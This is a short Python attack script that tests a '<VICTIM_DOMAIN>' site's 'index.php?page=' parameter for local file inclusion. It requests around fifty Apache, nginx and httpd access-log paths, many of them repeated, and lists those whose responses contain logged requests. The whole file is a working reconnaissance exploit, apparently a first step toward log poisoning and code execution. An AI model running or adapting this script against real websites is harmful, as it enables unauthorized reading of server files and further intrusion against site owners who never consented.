import requests

def check_access_log_locations(base_url):
    access_log_locations = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/access_log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/access.log",
        "/var/log/apache/access.log",
        "/var/log/apache/access_log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/access.log",
        "/var/log/apache2/access_log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/access.log",
        "/usr/local/apache/logs/access_log",
        "/usr/local/apache/logs/access.log",
        "/usr/local/apache2/logs/access_log",
        "/usr/local/apache2/logs/access.log",
        "/opt/apache/logs/access_log",
        "/opt/apache/logs/access.log",
        "/opt/apache2/logs/access_log",
        "/opt/apache2/logs/access.log",
        "/etc/httpd/logs/access_log",
        "/etc/httpd/logs/access.log",
        "/etc/httpd/access_log",
        "/etc/httpd/access.log",
        "/etc/apache2/logs/access_log",
        "/etc/apache2/logs/access.log",
        "/etc/apache2/access_log",
        "/etc/apache2/access.log",
        "/home/<USER>/apache/logs/access_log",
        "/home/<USER>/apache/logs/access.log",
        "/home/<USER>/apache2/logs/access_log",
        "/home/<USER>/apache2/logs/access.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/access.log",
        "/var/log/apache2/access_log",
        "/var/log/apache2/access.log",
        "/var/log/apache/access_log",
        "/var/log/apache/access.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/access.log",
        "/var/log/apache2/access_log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/access.log",
        "/usr/local/apache/logs/access_log",
        "/usr/local/apache/logs/access.log",
        "/usr/local/apache2/logs/access_log",
        "/usr/local/apache2/logs/access.log",
        "/opt/apache/logs/access_log",
        "/opt/apache/logs/access.log"
    ]

    found_locations = []

    for location in access_log_locations:
        url = f"{base_url}{location}"
        response = requests.get(url)
        if "GET" in response.text:
            found_locations.append(location)

    return found_locations

base_url = "https://<VICTIM_DOMAIN>/index.php?page="
found_locations = check_access_log_locations(base_url)
if found_locations:
    print("Found the access.log in the following locations:")
    for location in found_locations:
        print(location)
else:
    print("Coudln't find access.log.")
